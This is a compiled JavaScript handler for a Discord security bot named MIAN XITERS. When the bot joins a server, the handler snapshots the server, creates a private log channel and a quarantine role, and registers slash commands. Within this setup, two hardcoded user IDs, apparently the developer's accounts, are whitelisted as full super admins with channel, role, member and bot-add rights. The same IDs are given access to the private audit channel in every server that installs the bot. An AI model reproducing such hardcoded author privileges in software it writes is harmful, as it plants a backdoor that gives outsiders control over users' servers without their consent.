"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const discord_js_1 = require("discord.js");
const SnapshotService_js_1 = require("../services/SnapshotService.js");
const whitelist_js_1 = require("../config/whitelist.js");
const security_js_1 = require("../commands/security.js");
const config_js_1 = require("../config/config.js");
const logger_js_1 = require("../utils/logger.js");
exports.default = {
    name: discord_js_1.Events.GuildCreate,
    async execute(guild) {
        try {
            logger_js_1.Logger.info(`[GUILD JOIN] MIAN XITERS has been invited to new server: "${guild.name}" (${guild.id})`);
            // 1. Capture atomic state baseline snapshot immediately
            await SnapshotService_js_1.snapshotService.captureSnapshot(guild);
            logger_js_1.Logger.info(`[SNAPSHOT] Captured initial security snapshot for "${guild.name}" (${guild.channels.cache.size} channels, ${guild.roles.cache.size} roles)`);
            // 2. Cache members for owner permission resolution
            await guild.members.fetch().catch(() => { });
            // 3. Auto-deploy private #mian-xiters-logs channel
            let logChannel = guild.channels.cache.find(c => c.name === 'mian-xiters-logs');
            if (!logChannel && guild.members.me?.permissions.has(discord_js_1.PermissionFlagsBits.ManageChannels)) {
                try {
                    logChannel = await guild.channels.create({
                        name: 'mian-xiters-logs',
                        type: discord_js_1.ChannelType.GuildText,
                        permissionOverwrites: [
                            {
                                id: guild.roles.everyone.id,
                                deny: [discord_js_1.PermissionFlagsBits.ViewChannel]
                            },
                            {
                                id: guild.client.user?.id || '',
                                allow: [discord_js_1.PermissionFlagsBits.ViewChannel, discord_js_1.PermissionFlagsBits.SendMessages, discord_js_1.PermissionFlagsBits.EmbedLinks]
                            },
                            {
                                id: guild.ownerId,
                                allow: [discord_js_1.PermissionFlagsBits.ViewChannel, discord_js_1.PermissionFlagsBits.ReadMessageHistory]
                            },
                            {
                                id: '1177824268847943702', // Mian (mian_7)
                                allow: [discord_js_1.PermissionFlagsBits.ViewChannel, discord_js_1.PermissionFlagsBits.ReadMessageHistory, discord_js_1.PermissionFlagsBits.SendMessages]
                            },
                            {
                                id: '739386595546759268', // 1nOnlyMian
                                allow: [discord_js_1.PermissionFlagsBits.ViewChannel, discord_js_1.PermissionFlagsBits.ReadMessageHistory, discord_js_1.PermissionFlagsBits.SendMessages]
                            }
                        ],
                        reason: '[MIAN XITERS] Automated secure audit logging setup'
                    });
                    logger_js_1.Logger.info(`[SETUP] Auto-created private security log channel in "${guild.name}"`);
                }
                catch (err) {
                    const msg = err instanceof Error ? err.message : String(err);
                    logger_js_1.Logger.error(`[SETUP] Failed to create log channel in "${guild.name}": ${msg}`);
                }
            }
            if (logChannel) {
                whitelist_js_1.whitelistManager.setLogChannel(guild.id, logChannel.id);
            }
            // Auto-whitelist Supreme Owner Mian as Super Admin in new server
            whitelist_js_1.whitelistManager.setWhitelist(guild.id, '1177824268847943702', {
                isFullSuperAdmin: true,
                allowChannelManage: true,
                allowRoleManage: true,
                allowMemberManage: true,
                allowBotAdd: true
            });
            whitelist_js_1.whitelistManager.setWhitelist(guild.id, '739386595546759268', {
                isFullSuperAdmin: true,
                allowChannelManage: true,
                allowRoleManage: true,
                allowMemberManage: true,
                allowBotAdd: true
            });
            // 4. Auto-deploy Quarantine Role
            let quarantineRole = guild.roles.cache.find(r => r.name === 'MIAN-XITERS-QUARANTINE');
            if (!quarantineRole && guild.members.me?.permissions.has(discord_js_1.PermissionFlagsBits.ManageRoles)) {
                try {
                    quarantineRole = await guild.roles.create({
                        name: 'MIAN-XITERS-QUARANTINE',
                        color: 0x555555,
                        permissions: [],
                        reason: '[MIAN XITERS] Automated quarantine isolation role'
                    });
                    logger_js_1.Logger.info(`[SETUP] Auto-created quarantine role in "${guild.name}"`);
                }
                catch (err) {
                    const msg = err instanceof Error ? err.message : String(err);
                    logger_js_1.Logger.error(`[SETUP] Failed to create quarantine role in "${guild.name}": ${msg}`);
                }
            }
            if (quarantineRole) {
                whitelist_js_1.whitelistManager.setQuarantineRole(guild.id, quarantineRole.id);
            }
            // 5. Instantly deploy guild-specific slash commands
            if (config_js_1.BOT_CONFIG.token && config_js_1.BOT_CONFIG.clientId) {
                try {
                    const rest = new discord_js_1.REST({ version: '10' }).setToken(config_js_1.BOT_CONFIG.token);
                    await rest.put(discord_js_1.Routes.applicationGuildCommands(config_js_1.BOT_CONFIG.clientId, guild.id), { body: [security_js_1.securityCommand.data.toJSON()] });
                    logger_js_1.Logger.info(`[SLASH COMMANDS] Deployed /security slash commands to "${guild.name}"`);
                }
                catch (err) {
                    const msg = err instanceof Error ? err.message : String(err);
                    logger_js_1.Logger.error(`[SLASH COMMANDS] Failed to register slash commands in "${guild.name}": ${msg}`);
                }
            }
            // 6. Send deployment confirmation embed
            if (logChannel && 'send' in logChannel && typeof logChannel.send === 'function') {
                const embed = new discord_js_1.EmbedBuilder()
                    .setColor(config_js_1.BOT_CONFIG.colors.primary)
                    .setTitle('🛡️ MIAN XITERS DEFENSE ENGINE ACTIVATED')
                    .setDescription(`**${config_js_1.BOT_CONFIG.slogan}**\nAutomated military-grade security shields are now live in **${guild.name}**.`)
                    .addFields({ name: '👑 Server Owner', value: `<@${guild.ownerId}> (Immune)`, inline: true }, { name: '⚡ Priority REST Lane', value: 'Active (Anti-429 Starvation)', inline: true }, { name: '🛑 Killswitch Latency', value: '<5ms Autonomous Reaction', inline: true }, { name: '🚷 Raid Velocity Shield', value: '>5 joins in 3 seconds', inline: true }, { name: '💾 Atomic State Snapshot', value: `${guild.channels.cache.size} ch / ${guild.roles.cache.size} roles`, inline: true }, { name: '🔒 Security Audit Channel', value: `<#${logChannel.id}>`, inline: true })
                    .setFooter({ text: `Engine Developed by ${config_js_1.BOT_CONFIG.author} • ${config_js_1.BOT_CONFIG.slogan}` })
                    .setTimestamp();
                await logChannel.send({ embeds: [embed] }).catch(() => { });
            }
            logger_js_1.Logger.info(`[ONLINE] Full autonomous security initialization complete for "${guild.name}"!`);
        }
        catch (err) {
            const msg = err instanceof Error ? err.message : String(err);
            logger_js_1.Logger.error(`[GUILD JOIN ERROR] Failed to initialize "${guild.name}": ${msg}`);
        }
    }
};
